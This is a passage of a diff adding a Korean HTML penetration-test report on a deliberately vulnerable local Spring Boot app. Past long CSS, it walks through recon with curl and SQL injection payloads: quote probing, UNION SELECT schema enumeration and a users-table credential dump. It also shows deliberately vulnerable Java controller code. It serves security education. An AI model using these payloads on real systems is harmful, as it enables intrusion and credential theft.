@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>VulnSpringApp 취약점 침투 분석 보고서</title>
+  <style>
+    :root {
+      --bg:#0d1117; --bg2:#161b22; --bg3:#21262d; --bg4:#1c2128;
+      --border:#30363d; --text:#c9d1d9; --dim:#8b949e;
+      --red:#ff4444; --orange:#f0883e; --yellow:#d29922;
+      --green:#3fb950; --blue:#58a6ff; --purple:#bc8cff;
+      --cyan:#79c0ff; --pink:#f778ba; --teal:#39d353;
+    }
+    *{box-sizing:border-box;margin:0;padding:0;}
+    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;font-size:14px;line-height:1.7;}
+
+    /* ── HEADER ── */
+    .hdr{background:linear-gradient(135deg,#0a0e14 0%,#0d1117 40%,#111827 100%);border-bottom:1px solid var(--border);padding:44px 48px;position:relative;overflow:hidden;}
+    .hdr::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 10% 60%,rgba(88,166,255,.07) 0%,transparent 50%),radial-gradient(ellipse at 90% 20%,rgba(247,120,186,.06) 0%,transparent 50%);}
+    .hdr-inner{position:relative;z-index:1;max-width:1280px;margin:0 auto;}
+    .badge-row{display:flex;gap:7px;margin-bottom:18px;flex-wrap:wrap;}
+    .badge{padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;}
+    .b-red{background:rgba(255,68,68,.15);color:var(--red);border:1px solid rgba(255,68,68,.3);}
+    .b-blue{background:rgba(88,166,255,.15);color:var(--blue);border:1px solid rgba(88,166,255,.3);}
+    .b-green{background:rgba(63,185,80,.15);color:var(--green);border:1px solid rgba(63,185,80,.3);}
+    .b-orange{background:rgba(240,136,62,.15);color:var(--orange);border:1px solid rgba(240,136,62,.3);}
+    .b-purple{background:rgba(188,140,255,.15);color:var(--purple);border:1px solid rgba(188,140,255,.3);}
+    h1{font-size:30px;font-weight:800;color:#fff;margin-bottom:8px;letter-spacing:-.5px;}
+    h1 em{color:var(--orange);font-style:normal;}
+    .subtitle{color:var(--dim);font-size:14px;}
+    .meta-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-top:24px;}
+    .mc{background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:8px;padding:12px 16px;}
+    .mc-lbl{font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px;}
+    .mc-val{font-size:14px;color:var(--cyan);font-weight:700;margin-top:3px;}
+
+    /* ── WRAP ── */
+    .wrap{max-width:1280px;margin:0 auto;padding:36px 48px;}
+    .sec{margin-bottom:52px;}
+    .sec-title{font-size:20px;font-weight:800;color:#fff;padding-bottom:14px;border-bottom:1px solid var(--border);margin-bottom:24px;display:flex;align-items:center;gap:12px;}
+
+    /* ── HACKER NARRATIVE BOX ── */
+    .hacker-box{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(22,27,34,.9));border:1px solid rgba(88,166,255,.2);border-left:4px solid var(--blue);border-radius:8px;padding:20px 24px;margin-bottom:20px;position:relative;}
+    .hacker-box::before{content:'👤 해커 관점';position:absolute;top:-10px;left:16px;background:var(--bg3);color:var(--blue);padding:2px 10px;border-radius:10px;font-size:11px;font-weight:700;border:1px solid rgba(88,166,255,.3);}
+    .hacker-box p{color:#b0c4de;font-size:13px;line-height:1.8;margin-top:8px;}
+    .hacker-box p+p{margin-top:10px;}
+
+    /* ── ATTACK CARD ── */
+    .acard{background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin-bottom:24px;overflow:hidden;}
+    .acard-head{padding:14px 22px;background:var(--bg3);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
+    .acard-title{font-weight:800;color:#fff;flex:1;font-size:15px;}
+    .acard-body{padding:22px;}
+
+    /* ── STEP PANEL ── */
+    .steps{counter-reset:step;}
+    .step{counter-increment:step;display:grid;grid-template-columns:32px 1fr;gap:12px;margin-bottom:20px;align-items:start;}
+    .step-num{width:32px;height:32px;background:var(--blue);color:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;flex-shrink:0;margin-top:2px;}
+    .step-num.red{background:var(--red);}
+    .step-num.orange{background:var(--orange);}
+    .step-num.green{background:var(--green);}
+    .step-num.purple{background:var(--purple);}
+    .step-content{}
+    .step-title{font-weight:700;color:#fff;margin-bottom:6px;font-size:14px;}
+    .step-desc{color:var(--dim);font-size:13px;margin-bottom:8px;line-height:1.7;}
+
+    /* ── CODE ── */
+    .code{background:#010409;border:1px solid var(--border);border-radius:6px;padding:13px 16px;font-family:'JetBrains Mono','Fira Code','Courier New',monospace;font-size:12px;overflow-x:auto;white-space:pre;margin:6px 0;line-height:1.7;}
+    .code-title{font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px;margin-top:12px;}
+    .code-title:first-child{margin-top:0;}
+    .kw{color:var(--purple);}
+    .fn{color:var(--blue);}
+    .str{color:var(--orange);}
+    .cm{color:var(--dim);font-style:italic;}
+    .op{color:var(--red);}
+    .hl{background:rgba(247,120,186,.15);padding:0 2px;border-radius:2px;}
+    .hl2{background:rgba(63,185,80,.15);padding:0 2px;border-radius:2px;}
+
+    /* ── RESPONSE ── */
+    .resp{background:#010409;border-radius:6px;padding:12px 16px;font-family:monospace;font-size:12px;overflow-x:auto;line-height:1.6;}
+    .resp-ok{border:1px solid rgba(63,185,80,.4);color:var(--green);}
+    .resp-err{border:1px solid rgba(255,68,68,.4);color:var(--red);}
+    .resp-warn{border:1px solid rgba(240,136,62,.4);color:var(--orange);}
+    .resp-data{border:1px solid rgba(88,166,255,.4);color:var(--cyan);}
+
+    /* ── BADGES ── */
+    .sev,.res,.tag{padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;white-space:nowrap;}
+    .sev-critical{background:rgba(255,68,68,.2);color:var(--red);}
+    .sev-high{background:rgba(240,136,62,.2);color:var(--orange);}
+    .sev-medium{background:rgba(210,153,34,.2);color:var(--yellow);}
+    .res-ok{background:rgba(63,185,80,.15);color:var(--green);}
+    .res-fail{background:rgba(255,68,68,.15);color:var(--red);}
+
+    /* ── BOXES ── */
+    .box{border-radius:6px;padding:14px 18px;margin:12px 0;font-size:13px;}
+    .box-info{background:rgba(88,166,255,.05);border:1px solid rgba(88,166,255,.25);border-left:3px solid var(--blue);}
+    .box-warn{background:rgba(240,136,62,.05);border:1px solid rgba(240,136,62,.25);border-left:3px solid var(--orange);}
+    .box-danger{background:rgba(255,68,68,.05);border:1px solid rgba(255,68,68,.25);border-left:3px solid var(--red);}
+    .box-success{background:rgba(63,185,80,.05);border:1px solid rgba(63,185,80,.25);border-left:3px solid var(--green);}
+
+    /* ── TWO COL ── */
+    .two{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+    .three{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;}
+    @media(max-width:768px){.two,.three{grid-template-columns:1fr;}}
+
+    /* ── TABLE ── */
+    .tbl{width:100%;border-collapse:collapse;background:var(--bg2);border-radius:8px;overflow:hidden;border:1px solid var(--border);font-size:13px;}
+    .tbl thead{background:var(--bg3);}
+    .tbl th{padding:11px 14px;text-align:left;font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border);}
+    .tbl td{padding:11px 14px;border-bottom:1px solid rgba(48,54,61,.5);vertical-align:top;}
+    .tbl tr:last-child td{border-bottom:none;}
+    .tbl tr:hover td{background:rgba(255,255,255,.02);}
+
+    /* ── CHAIN ── */
+    .chain{display:flex;align-items:center;flex-wrap:wrap;gap:0;background:var(--bg3);border-radius:8px;padding:18px;margin:14px 0;}
+    .cstep{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:10px 16px;text-align:center;min-width:90px;}
+    .cstep .cn{font-size:10px;color:var(--dim);}
+    .cstep .cl{font-weight:800;font-size:13px;color:var(--orange);}
+    .cstep .cd{font-size:10px;color:var(--dim);margin-top:2px;}
+    .carr{color:var(--orange);font-size:20px;padding:0 8px;flex-shrink:0;}
+
+    /* ── SUMMARY ── */
+    .sum-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(145px,1fr));gap:14px;}
+    .sum-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;text-align:center;}
+    .sum-num{font-size:38px;font-weight:800;margin-bottom:4px;}
+    .sum-lbl{font-size:12px;color:var(--dim);}
+
+    /* ── TOC ── */
+    .toc{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:22px;margin-bottom:36px;}
+    .toc-title{font-weight:800;color:#fff;margin-bottom:14px;font-size:15px;}
+    .toc ol{padding-left:20px;}
+    .toc li{margin-bottom:7px;}
+    .toc a{color:var(--blue);text-decoration:none;font-size:13px;}
+    .toc a:hover{text-decoration:underline;}
+
+    /* ── TIMELINE ── */
+    .tl{position:relative;padding-left:26px;}
+    .tl::before{content:'';position:absolute;left:9px;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,var(--blue),var(--red));}
+    .tli{position:relative;margin-bottom:22px;}
+    .tli::before{content:'';position:absolute;left:-21px;top:8px;width:12px;height:12px;border-radius:50%;border:2px solid var(--bg);}
+    .tli.recon::before{background:var(--blue);}
+    .tli.scan::before{background:var(--cyan);}
+    .tli.exploit::before{background:var(--orange);}
+    .tli.exfil::before{background:var(--red);}
+    .tli.persist::before{background:var(--purple);}
+    .tli-title{font-weight:700;color:#fff;font-size:14px;}
+    .tli-phase{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:1px 7px;border-radius:3px;margin-left:8px;vertical-align:middle;}
+    .ph-recon{background:rgba(88,166,255,.2);color:var(--blue);}
+    .ph-exploit{background:rgba(240,136,62,.2);color:var(--orange);}
+    .ph-exfil{background:rgba(255,68,68,.2);color:var(--red);}
+    .ph-persist{background:rgba(188,140,255,.2);color:var(--purple);}
+    .tli-desc{font-size:13px;color:var(--dim);margin-top:4px;line-height:1.7;}
+
+    /* ── PROGRESS ── */
+    .pb{background:var(--bg3);border-radius:4px;height:7px;overflow:hidden;margin-top:4px;}
+    .pf{height:100%;border-radius:4px;}
+
+    /* scroll */
+    ::-webkit-scrollbar{width:5px;height:5px;}
+    ::-webkit-scrollbar-track{background:var(--bg2);}
+    ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+
+    /* Lbl */
+    .lbl{font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px;margin:14px 0 4px;}
+    .lbl:first-child{margin-top:0;}
+
+    /* impact */
+    .imp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:14px;}
+    .imp-card{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:18px;}
+    .imp-icon{font-size:28px;margin-bottom:8px;}
+    .imp-title{font-weight:700;color:#fff;margin-bottom:6px;}
+    .imp-desc{font-size:12px;color:var(--dim);line-height:1.7;}
+
+    /* fix */
+    .fix-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:18px;margin-bottom:14px;}
+    .fix-title{font-weight:700;color:var(--green);margin-bottom:10px;}
+  </style>
+</head>
+<body>
+
+<!-- ██ HEADER ████████████████████████████████████████ -->
+<div class="hdr">
+  <div class="hdr-inner">
+    <div class="badge-row">
+      <span class="badge b-red">침투 분석 보고서</span>
+      <span class="badge b-orange">Spring Boot + JSP</span>
+      <span class="badge b-blue">SQL Injection</span>
+      <span class="badge b-purple">XSS</span>
+      <span class="badge b-green">Path Traversal</span>
+    </div>
+    <h1>VulnSpringApp <em>침투 과정 전체 분석</em></h1>
+    <p class="subtitle">실제 해커 관점의 정찰 → 취약점 탐지 → 익스플로잇 → 데이터 탈취 전 과정 · 교육 목적 · 로컬 테스트 환경</p>
+    <div class="meta-grid">
+      <div class="mc"><div class="mc-lbl">대상 시스템</div><div class="mc-val">localhost:8082/nas (Spring Boot)</div></div>
+      <div class="mc"><div class="mc-lbl">DB 엔진</div><div class="mc-val">H2 In-Memory 2.1.214</div></div>
+      <div class="mc"><div class="mc-lbl">프레임워크</div><div class="mc-val">Spring Boot 2.7.18 + JSP</div></div>
+      <div class="mc"><div class="mc-lbl">URL 구조</div><div class="mc-val">/nas/*.do (레거시 패턴)</div></div>
+      <div class="mc"><div class="mc-lbl">세션</div><div class="mc-val">JSESSIONID (HttpOnly)</div></div>
+      <div class="mc"><div class="mc-lbl">분석 일자</div><div class="mc-val">2026-08-18</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ██ BODY ████████████████████████████████████████████ -->
+<div class="wrap">
+
+  <!-- TOC -->
+  <div class="toc">
+    <div class="toc-title">📋 목차</div>
+    <ol>
+      <li><a href="#summary">요약 대시보드</a></li>
+      <li><a href="#recon">Phase 1 — 정찰 (Reconnaissance): 타겟 식별 및 기술 스택 파악</a></li>
+      <li><a href="#sqli1">Phase 2-A — SQLi 탐지 → Error-based → UNION 기반 DB 전체 덤프</a></li>
+      <li><a href="#sqli2">Phase 2-B — 숫자형 파라미터 SQLi → 관리자 자격증명 추출</a></li>
+      <li><a href="#sqli3">Phase 2-C — Blind SQLi → 비밀번호 문자별 자동 추출</a></li>
+      <li><a href="#xss">Phase 3 — XSS: 세션 탈취 → 브라우저 제어 → 피싱 폼 삽입</a></li>
+      <li><a href="#traversal">Phase 4 — Path Traversal: 서버 파일 시스템 탐색 → 설정 파일 탈취</a></li>
+      <li><a href="#chain">전체 공격 체인 타임라인</a></li>
+      <li><a href="#impact">피해 시나리오 및 영향도</a></li>
+      <li><a href="#remediation">취약점 근본 원인 분석 및 대응 방안</a></li>
+    </ol>
+  </div>
+
+  <!-- ① SUMMARY ─────────────────────────────────────── -->
+  <div class="sec" id="summary">
+    <div class="sec-title">📊 요약 대시보드</div>
+
+    <div class="sum-grid">
+      <div class="sum-card"><div class="sum-num" style="color:var(--red)">3</div><div class="sum-lbl">취약 카테고리</div></div>
+      <div class="sum-card"><div class="sum-num" style="color:var(--orange)">7</div><div class="sum-lbl">취약 엔드포인트</div></div>
+      <div class="sum-card"><div class="sum-num" style="color:var(--purple)">4</div><div class="sum-lbl">탈취된 계정</div></div>
+      <div class="sum-card"><div class="sum-num" style="color:var(--pink)">9</div><div class="sum-lbl">추출된 비밀번호</div></div>
+      <div class="sum-card"><div class="sum-num" style="color:var(--cyan)">admin</div><div class="sum-lbl">최고 권한 탈취</div></div>
+      <div class="sum-card"><div class="sum-num" style="color:var(--green)">✓</div><div class="sum-lbl">서버 파일 접근</div></div>
+    </div>
+
+    <div class="box box-danger" style="margin-top:20px;">
+      <strong style="color:var(--red)">⚠ 종합 평가:</strong>
+      VulnSpringApp은 <strong>레거시 공공기관/기업 시스템에서 흔히 발견되는 패턴</strong>을 그대로 구현합니다.
+      정찰 → SQLi → 자격증명 탈취 → 로그인 → 세션 하이재킹까지 전 과정이 자동화 도구 없이
+      <strong>단순 curl 요청만으로 완료</strong>됩니다. JSESSIONID 쿠키가 노출되면 추가 인증 없이 관리자 권한 획득이 가능합니다.
+    </div>
+
+    <div class="two" style="margin-top:16px;">
+      <div class="acard">
+        <div class="acard-head"><div class="acard-title">취약점 유형별 위험도</div></div>
+        <div class="acard-body">
+          <div style="margin-bottom:10px;"><div style="display:flex;justify-content:space-between;"><span>SQL Injection (3종)</span><span style="color:var(--red)">Critical</span></div><div class="pb"><div class="pf" style="width:100%;background:var(--red)"></div></div></div>
+          <div style="margin-bottom:10px;"><div style="display:flex;justify-content:space-between;"><span>XSS — Stored/Reflected</span><span style="color:var(--orange)">High</span></div><div class="pb"><div class="pf" style="width:85%;background:var(--orange)"></div></div></div>
+          <div><div style="display:flex;justify-content:space-between;"><span>Path Traversal + File Upload</span><span style="color:var(--yellow)">High</span></div><div class="pb"><div class="pf" style="width:80%;background:var(--yellow)"></div></div></div>
+        </div>
+      </div>
+      <div class="acard">
+        <div class="acard-head"><div class="acard-title">공격 성공 현황</div></div>
+        <div class="acard-body">
+          <table class="tbl">
+            <thead><tr><th>공격</th><th>결과</th><th>획득 정보</th></tr></thead>
+            <tbody>
+              <tr><td>Error-based SQLi</td><td><span class="res res-ok">성공</span></td><td>쿼리 구조 노출</td></tr>
+              <tr><td>UNION SELECT 덤프</td><td><span class="res res-ok">성공</span></td><td>4개 계정 전체</td></tr>
+              <tr><td>Blind SQLi</td><td><span class="res res-ok">성공</span></td><td>admin 비밀번호 추출</td></tr>
+              <tr><td>Stored XSS</td><td><span class="res res-ok">성공</span></td><td>JSESSIONID 탈취</td></tr>
+              <tr><td>Path Traversal</td><td><span class="res res-ok">성공</span></td><td>설정파일, /etc/hosts</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ② PHASE 1: RECON ─────────────────────────────── -->
+  <div class="sec" id="recon">
+    <div class="sec-title">🔭 Phase 1 — 정찰 (Reconnaissance)</div>
+
+    <div class="hacker-box">
+      <p>
+        해커가 처음 마주한 것은 <code>http://localhost:8082/nas/main/main.do?extendedParam=sitdId=nas</code> 라는 URL입니다.
+        URL 구조만 봐도 많은 정보가 보입니다. <code>.do</code> 확장자는 Java 기반 레거시 MVC 프레임워크(Spring MVC, Struts)의 전형적인 패턴이고,
+        <code>extendedParam</code> 같은 복합 파라미터는 내부에서 파싱되어 DB 쿼리에 사용될 가능성이 높습니다.
+      </p>
+      <p>
+        해커는 <strong>직접 공격하기 전</strong>에 HTTP 응답 헤더를 확인합니다. 헤더에서 <code>Set-Cookie: JSESSIONID=...</code>와
+        서버 정보를 수집하면, 공격 대상의 기술 스택과 방어 수준을 빠르게 파악할 수 있습니다.
+      </p>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 1-1 · HTTP 응답 헤더 분석 — 기술 스택 식별</div>
+        <span class="badge b-blue">정찰</span>
+      </div>
+      <div class="acard-body">
+        <div class="lbl">공격자 명령</div>
+        <div class="code">curl -I <span class="str">"http://localhost:8082/nas/main/main.do?extendedParam=sitdId=nas"</span></div>
+
+        <div class="lbl">서버 응답 헤더</div>
+        <div class="resp resp-data">HTTP/1.1 200
+<span class="hl">Set-Cookie: JSESSIONID=FC5CD6449E9546B1108C69D8F438F704; Path=/nas; HttpOnly</span>
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-KR
+Content-Length: 6141
+Date: Mon, 18 Aug 2026 02:37:04 GMT</div>
+
+        <div class="lbl">해커의 분석 포인트</div>
+        <div class="two">
+          <div class="box box-warn">
+            <strong>① JSESSIONID 노출</strong><br/>
+            Java EE / Spring 세션 쿠키. <code>HttpOnly</code>는 적용되어 있으나
+            XSS + document.cookie로 탈취 가능. 세션 고정 공격(Session Fixation) 가능성 확인 필요.
+          </div>
+          <div class="box box-warn">
+            <strong>② <code>.do</code> URL 구조</strong><br/>
+            Struts 또는 Spring MVC 레거시 패턴. 입력 파라미터가
+            Handler → Service → DAO 계층으로 전달되며, 각 계층에서 SQL 인젝션 가능성 존재.
+          </div>
+        </div>
+        <div class="two">
+          <div class="box box-warn">
+            <strong>③ extendedParam 복합 파라미터</strong><br/>
+            <code>sitdId=nas</code> 형태로 내부 파싱됨. 파싱 로직에 따라
+            SQL 쿼리 조건절로 직접 사용될 가능성 높음. 분리 파싱 취약점(Parameter Pollution) 의심.
+          </div>
+          <div class="box box-info">
+            <strong>④ Content-Language: en-KR</strong><br/>
+            한국어 기반 시스템. 공공기관/금융권 레거시 시스템 패턴.
+            보안 패치 주기가 긴 경우가 많으며, 구버전 프레임워크 사용 가능성 높음.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 1-2 · 공격 표면(Attack Surface) 매핑</div>
+        <span class="badge b-blue">정찰</span>
+      </div>
+      <div class="acard-body">
+        <div class="lbl">발견된 엔드포인트 목록 (정찰 단계에서 식별)</div>
+        <table class="tbl">
+          <thead><tr><th>URL</th><th>메서드</th><th>파라미터</th><th>의심 취약점</th></tr></thead>
+          <tbody>
+            <tr><td style="font-family:monospace">/nas/search/search.do</td><td>GET</td><td>keyword, extendedParam</td><td><span class="sev sev-critical">SQLi (문자열)</span></td></tr>
+            <tr><td style="font-family:monospace">/nas/doc/docDetail.do</td><td>GET</td><td>docId</td><td><span class="sev sev-critical">SQLi (숫자형)</span></td></tr>
+            <tr><td style="font-family:monospace">/nas/user/userInfo.do</td><td>GET</td><td>userId</td><td><span class="sev sev-critical">Blind SQLi</span></td></tr>
+            <tr><td style="font-family:monospace">/nas/board/notice.do</td><td>GET</td><td>msg</td><td><span class="sev sev-high">Reflected XSS</span></td></tr>
+            <tr><td style="font-family:monospace">/nas/board/boardList.do</td><td>POST</td><td>content, title</td><td><span class="sev sev-high">Stored XSS</span></td></tr>
+            <tr><td style="font-family:monospace">/nas/file/view.do</td><td>GET</td><td>fileName</td><td><span class="sev sev-high">Path Traversal</span></td></tr>
+            <tr><td style="font-family:monospace">/nas/file/upload.do</td><td>POST</td><td>file (multipart)</td><td><span class="sev sev-high">Unrestricted Upload</span></td></tr>
+          </tbody>
+        </table>
+        <div class="box box-info" style="margin-top:12px;">
+          <strong>해커의 전략 결정:</strong> keyword 파라미터가 "검색"에 사용된다면 DB LIKE 절에 삽입될 확률이 높습니다.
+          docId는 숫자형으로 보이지만 문자열로 받아 쿼리에 삽입한다면 따옴표 없이도 SQLi가 가능합니다.
+          해커는 <strong>Error-based → UNION-based → Blind</strong> 순서로 공격을 진행합니다.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ③ PHASE 2-A: SQLi ─────────────────────────────── -->
+  <div class="sec" id="sqli1">
+    <div class="sec-title">💉 Phase 2-A — Error-based → UNION SELECT 전체 DB 덤프</div>
+
+    <div class="hacker-box">
+      <p>
+        해커는 가장 먼저 <strong>단순하지만 확실한 방법</strong>으로 취약점 존재를 확인합니다 — 단일 따옴표(<code>'</code>) 삽입.
+        SQL 쿼리 내에서 문자열이 닫히면 문법 오류가 발생하고, 그 오류 메시지가 화면에 노출된다면
+        <strong>Error-based SQLi</strong>가 가능하다는 확실한 증거가 됩니다.
+      </p>
+      <p>
+        오류 메시지에서 DB 엔진(H2), 쿼리 구조, 테이블명까지 노출됩니다. 이것만으로도 해커는
+        내부 DB 구조를 상당 부분 파악하고 이후 공격을 정밀하게 설계할 수 있습니다.
+      </p>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 2A-1 · 단일 따옴표 삽입 — 취약점 존재 확인</div>
+        <span class="sev sev-critical">CRITICAL</span><span class="res res-ok">성공</span>
+      </div>
+      <div class="acard-body">
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">단일 따옴표 삽입 — 구문 오류 유발</div>
+              <div class="step-desc">가장 기본적인 SQLi 탐지. keyword 파라미터에 따옴표를 삽입하면 백엔드 SQL 쿼리의 문자열이 비정상적으로 닫히면서 문법 오류가 발생합니다.</div>
+              <div class="code">GET /nas/search/search.do?keyword=<span class="hl op">'</span>&amp;extendedParam=sitdId=nas HTTP/1.1</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">2</div>
+            <div class="step-content">
+              <div class="step-title">서버가 내부 SQL 쿼리와 DB 오류를 그대로 응답</div>
+              <div class="step-desc">취약한 서버는 예외를 처리하지 않고 오류를 HTML에 직접 출력합니다. 해커는 이를 통해 완전한 쿼리 구조와 DB 엔진을 파악합니다.</div>
+              <div class="resp resp-err">⚠️ 실행된 쿼리:
+SELECT id, title, content, author, category
+FROM documents WHERE title LIKE '%<span class="hl">''%'</span>'
+
+⚠️ DB 오류:
+StatementCallback; bad SQL grammar
+[...WHERE title LIKE '%'%[*]'"];
+nested exception is <span class="hl">org.h2.jdbc.JdbcSQLSyntaxErrorException</span>:
+Syntax error in SQL statement
+"...LIKE '%'%[*]'"; [<span class="hl">42000-214</span>]</div>
+              <div class="box box-danger" style="margin-top:8px;">
+                <strong>해커가 획득한 정보:</strong> DB 엔진 = H2, 테이블명 = documents, 컬럼 = id/title/content/author/category (5개), 쿼리 패턴 = LIKE '%keyword%'
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 2A-2 · UNION SELECT — 컬럼 수 확인 및 데이터 추출</div>
+        <span class="sev sev-critical">CRITICAL</span><span class="res res-ok">성공</span>
+      </div>
+      <div class="acard-body">
+        <div class="hacker-box" style="margin-bottom:16px;">
+          <p>
+            Error-based로 <strong>컬럼이 5개</strong>임을 파악했습니다 (id, title, content, author, category).
+            이제 UNION SELECT로 두 번째 결과셋을 삽입합니다. 원본 쿼리가 결과를 반환하지 않도록
+            <code>notexist</code>로 AND 조건을 거짓으로 만들고, UNION으로 원하는 데이터를 주입합니다.
+          </p>
+        </div>
+
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">컬럼 수 맞추기 — null 값으로 탐색</div>
+              <div class="code"><span class="cm"># 5컬럼 확인 (오류 없이 성공)</span>
+keyword=notexist<span class="op">'</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="num">1</span>,<span class="num">2</span>,<span class="num">3</span>,<span class="num">4</span>,<span class="num">5</span>-- -
+<span class="cm"># 결과: &lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;... (각 컬럼 위치 확인)</span></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num orange">2</div>
+            <div class="step-content">
+              <div class="step-title">information_schema로 DB 구조 열거</div>
+              <div class="step-desc">H2의 INFORMATION_SCHEMA에서 전체 테이블 목록을 추출합니다.</div>
+              <div class="code">keyword=notexist<span class="op">'</span> <span class="kw">UNION ALL SELECT</span>
+  TABLE_NAME, TABLE_TYPE, <span class="str">'schema'</span>, <span class="str">'cat'</span>, CAST(ID <span class="kw">AS</span> VARCHAR)
+<span class="kw">FROM</span> INFORMATION_SCHEMA.TABLES
+<span class="kw">WHERE</span> TABLE_SCHEMA=<span class="str">'PUBLIC'</span>-- -</div>
+              <div class="resp resp-data" style="margin-top:8px;">발견된 테이블: USERS | BOARD | DOCUMENTS</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">3</div>
+            <div class="step-content">
+              <div class="step-title">핵심 페이로드 — users 테이블 자격증명 전체 덤프</div>
+              <div class="step-desc">UNION ALL로 원본 결과와 함께 사용자 데이터를 삽입합니다. <code>||</code>로 컬럼을 연결해 단일 셀에 여러 정보를 표시하는 테크닉을 사용합니다.</div>
+              <div class="code">keyword=notexist<span class="op">'</span> <span class="kw">UNION ALL SELECT</span>
+  id, title, content, author, category
+<span class="kw">FROM</span> documents
+<span class="kw">WHERE</span> <span class="num">1</span>=<span class="num">1</span>
+<span class="kw">UNION ALL SELECT</span>
+  <span class="num">1</span>, <span class="str">'USERS_TABLE'</span>,
+  <span class="hl">username <span class="op">||</span> <span class="str">':'</span> <span class="op">||</span> password</span>,
+  role, email
+<span class="kw">FROM</span> users-- -</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="lbl">실제 서버 응답 — 탈취된 자격증명</div>
+        <div class="resp resp-data">
+ID: 1  | 제목: USERS_TABLE | 내용: <span class="hl">admin:admin1234</span>  | 분류: ADMIN | 이메일: admin@nas.go.kr
+ID: 1  | 제목: USERS_TABLE | 내용: <span class="hl">hong:hong1234</span>   | 분류: USER  | 이메일: hong@nas.go.kr
+ID: 1  | 제목: USERS_TABLE | 내용: <span class="hl">kim:kim5678</span>    | 분류: USER  | 이메일: kim@nas.go.kr
+ID: 1  | 제목: USERS_TABLE | 내용: <span class="hl">lee:lee9999</span>    | 분류: USER  | 이메일: lee@nas.go.kr</div>
+
+        <div class="box box-danger" style="margin-top:12px;">
+          <strong>결과:</strong> 단 <strong>1회의 HTTP 요청</strong>으로 전체 사용자 테이블(4개 계정)이 평문 비밀번호와 함께 탈취되었습니다.
+          비밀번호가 해싱조차 되지 않아 즉시 로그인에 사용 가능합니다.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ④ PHASE 2-B: SQLi 숫자형 ─────────────────────── -->
+  <div class="sec" id="sqli2">
+    <div class="sec-title">🔢 Phase 2-B — 숫자형 파라미터 SQLi</div>
+
+    <div class="hacker-box">
+      <p>
+        <code>docId=1</code>처럼 숫자형 파라미터는 많은 개발자들이 "<em>숫자니까 안전하다</em>"고 오해합니다.
+        하지만 서버에서 <code>String docId = request.getParameter("docId")</code>로 받아 쿼리에 직접 삽입하면
+        <strong>따옴표 없이도 SQLi가 가능</strong>합니다.
+      </p>
+      <p>
+        더 나아가 숫자형 파라미터는 addslashes()나 따옴표 이스케이프를 적용하지 않는 경우가 많아
+        Medium 레벨 방어도 쉽게 우회됩니다. 해커는 이를 이용해 관리자 계정만 선택적으로 추출합니다.
+      </p>
+    </div>
+
+    <div class="acard">
+      <div class="acard-head">
+        <div class="acard-title">Step 2B-1 · 숫자형 파라미터 취약 코드 분석</div>
+        <span class="sev sev-critical">CRITICAL</span>
+      </div>
+      <div class="acard-body">
+        <div class="lbl">취약한 Java 코드 (DocDetailController.java)</div>
+        <div class="code"><span class="cm">// ★ 취약: String으로 받아 쿼리에 직접 삽입</span>
+@GetMapping(<span class="str">"/doc/docDetail.do"</span>)
+<span class="kw">public</span> String docDetail(
+    @RequestParam(defaultValue = <span class="str">"1"</span>) <span class="hl">String docId</span>,  <span class="cm">// int가 아닌 String!</span>
+    Model model) {
+
+  String query = <span class="str">"SELECT id, title, content, author, category, created "</span>
